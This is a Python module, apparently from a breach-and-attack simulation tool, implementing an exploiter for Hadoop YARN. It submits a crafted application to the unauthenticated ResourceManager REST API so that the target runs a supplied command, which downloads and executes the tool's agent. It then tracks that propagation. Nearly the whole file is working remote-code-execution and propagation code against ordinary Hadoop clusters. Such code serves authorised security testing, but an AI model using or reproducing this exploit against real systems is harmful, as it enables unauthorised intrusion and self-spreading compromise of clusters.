import json
import logging
import posixpath
import string
from http import HTTPStatus
from pprint import pformat
from time import time
from typing import Mapping, Tuple
from uuid import UUID

import requests

from common.agent_events import ExploitationEvent, PropagationEvent
from common.event_queue import IAgentEventPublisher
from common.tags import (
    T1105_ATTACK_TECHNIQUE_TAG,
    T1203_ATTACK_TECHNIQUE_TAG,
    T1210_ATTACK_TECHNIQUE_TAG,
)
from common.types import Event
from common.utils.code_utils import insecure_generate_random_string
from infection_monkey.model import TargetHost

from .hadoop_options import HadoopOptions

logger = logging.getLogger(__name__)

HADOOP_EXPLOITER_TAG = "hadoop-exploiter"
EXPLOITER_NAME = "HadoopExploiter"
RAND_STR_LEN = 6  # Random string's length that's used for creating unique app name
EXPLOITER_TAGS = (HADOOP_EXPLOITER_TAG, T1203_ATTACK_TECHNIQUE_TAG, T1210_ATTACK_TECHNIQUE_TAG)
PROPAGATION_TAGS = (HADOOP_EXPLOITER_TAG, T1105_ATTACK_TECHNIQUE_TAG)


class HadoopExploitClient:
    """
    Exploits Hadoop by submitting a new application to YARN. That application executes a custom
    command to download and execute the Agent.
    """

    def __init__(
        self,
        agent_id: UUID,
        agent_event_publisher: IAgentEventPublisher,
    ):
        self._agent_id = agent_id
        self._agent_event_publisher = agent_event_publisher

    def exploit(
        self,
        target_host: TargetHost,
        options: HadoopOptions,
        agent_binary_downloaded: Event,
        url: str,
        command: str,
    ) -> Tuple[bool, bool]:
        """
        Exploits a Hadoop server by submitting a new application to YARN

        :param url: URL to send malicious requests to. Format: [http/https]://ip:port/extension.
        :param command: Command that will be executed on remote host

        :return: A tuple of two booleans. The first boolean indicates whether the exploit succeeded.
                 The second boolean indicates wherther the propagation succeeded.
        """
        timestamp = time()

        exploitation_success = HadoopExploitClient._run_exploit(url, command, options)
        propagation_success = HadoopExploitClient._evaluate_propagation_success(
            exploitation_success, agent_binary_downloaded, options.agent_binary_download_timeout
        )

        exploitation_message = "" if exploitation_success else f"Failed to exploit via {url}"
        propagation_message = (
            "" if propagation_success else "The target did not download the agent binary"
        )

        self._publish_exploitation_event(
            target_host, timestamp, exploitation_success, error_message=exploitation_message
        )
        self._publish_propagation_event(
            target_host, timestamp, propagation_success, error_message=propagation_message
        )

        return exploitation_success, propagation_success

    @staticmethod
    def _run_exploit(url: str, command: str, options: HadoopOptions) -> bool:
        try:
            app_id = HadoopExploitClient._apply_for_application_id(url, options.request_timeout)
            payload = HadoopExploitClient._build_payload(
                app_id, options.yarn_application_suffix, command
            )
            resp = HadoopExploitClient._send_exploit_payload(url, payload, options.request_timeout)
        except requests.ConnectionError:
            return False

        return resp.status_code == HTTPStatus.ACCEPTED

    @staticmethod
    def _apply_for_application_id(url: str, request_timeout: float) -> str:
        """
        Applies for a new application id in YARN
        :param url: The URL to apply for a new application id
        :return: The new application id
        """
        application_url = posixpath.join(url, "ws/v1/cluster/apps/new-application")
        logger.info(f"Applying for new Hadoop application at {application_url}")

        # TODO: Fix crash here
        resp = requests.post(application_url, timeout=request_timeout)
        resp_dict = json.loads(resp.content)

        return resp_dict["application-id"]

    @staticmethod
    def _build_payload(
        app_id: str, yarn_application_suffix: str, command: str
    ) -> Mapping[str, str]:
        logger.info("Building Hadoop exploit payload")

        # Create a random name for our application in YARN
        # Avoid the risk of blocking by using insecure_generate_random_string()
        rand_name = yarn_application_suffix + insecure_generate_random_string(
            n=RAND_STR_LEN, character_set=string.ascii_lowercase
        )
        payload = {
            "application-id": app_id,
            "application-name": rand_name,
            "am-container-spec": {
                "commands": {
                    "command": command,
                }
            },
            "application-type": "YARN",
        }
        logger.debug(f"Hadoop exploit payload: {pformat(payload)}")

        return payload

    @staticmethod
    def _send_exploit_payload(
        url: str, payload: Mapping[str, str], timeout: int
    ) -> requests.Response:
        target_url = posixpath.join(url, "ws/v1/cluster/apps/")
        logger.info(f"Sending Hadoop exploit payload to {target_url}")

        resp = requests.post(
            target_url,
            json=payload,
            timeout=timeout,
        )
        logger.debug(f"Hadoop responded to exploit payload with code {resp.status_code}")

        return resp

    @staticmethod
    def _evaluate_propagation_success(
        exploitation_success: bool,
        agent_binary_downloaded: Event,
        agent_binary_download_timeout: float,
    ) -> bool:
        if not exploitation_success:
            return False

        logger.debug("Waiting for the target to download the agent binary...")
        agent_binary_downloaded.wait(agent_binary_download_timeout)

        return agent_binary_downloaded.is_set()

    def _publish_exploitation_event(
        self,
        target_host: TargetHost,
        time: float = time(),
        success: bool = False,
        tags: Tuple[str, ...] = tuple(),
        error_message: str = "",
    ):
        exploitation_event = ExploitationEvent(
            source=self._agent_id,
            target=target_host.ip,
            success=success,
            exploiter_name=EXPLOITER_NAME,
            error_message=error_message,
            timestamp=time,
            tags=frozenset(tags or EXPLOITER_TAGS),
        )
        self._agent_event_publisher.publish(exploitation_event)

    def _publish_propagation_event(
        self,
        target_host: TargetHost,
        time: float = time(),
        success: bool = False,
        tags: Tuple[str, ...] = tuple(),
        error_message: str = "",
    ):
        propagation_event = PropagationEvent(
            source=self._agent_id,
            target=target_host.ip,
            success=success,
            exploiter_name=EXPLOITER_NAME,
            error_message=error_message,
            timestamp=time,
            tags=frozenset(tags or PROPAGATION_TAGS),
        )
        self._agent_event_publisher.publish(propagation_event)
